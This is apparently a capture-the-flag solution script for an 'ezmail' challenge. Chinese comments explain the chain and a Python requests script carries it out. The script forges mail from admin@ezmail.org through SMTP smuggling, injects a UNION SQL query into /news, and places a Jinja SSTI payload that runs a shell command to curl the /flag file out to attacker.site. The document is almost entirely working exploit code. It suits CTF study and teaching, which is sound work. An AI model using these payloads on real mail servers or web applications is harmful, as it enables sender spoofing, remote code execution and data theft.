# 主要考点是SMTP Smuggling
# 注意到`/admin`下使用`render_template_string()`拼接渲染，可构造SSTI。
# 其中的可控部分源自本地邮箱里的来自`admin@ezmail.org`的邮件中的Subject里的url指向的本地页面内容。
# 虽然`/report`下能发送邮件，但是固定发送者为`ignored@ezmail.org`。
# 仔细阅读`/report`下的代码发现，邮件发送也经过拼接
# (为了方便构造出题的时候特意魔改了`smtplib._quote_periods`)
# 可以构造SMTP Smuggling，伪造发信人为`admin@ezmail.org` 。
# 同时注意到`news`页面存在SQLI。考虑将SSTI Payload用UNION的方式塞到页面里再由`/admin` 读取即可。

import requests

cookies = {
    'connect.sid': 'XXX',
}

headers = {
    'Host': 'ezmail.org:3000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}

content = """FAKE CONTENT\r\n""" + "\n.\n" + """\r\nmail FROM:<admin@ezmail.org>\r\nrcpt TO:<admin@ezmail.org>\r\ndata\r\nFrom: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: http://ezmail.org:3000/news?id=5 union select (select '{{request.application.__globals__.__builtins__.__import__("os").popen("curl http://attacker.site -d @/flag").read()}}') --\r\n\r\nSMUGGLING"""
data = f'url=123&content={content}'

response = requests.post('http://XXX.XXX.XXX.XXX:XXXX/report', cookies=cookies, headers=headers, data=data, verify=False)
requests.get('http://XXX.XXX.XXX.XXX:XXXX/bot')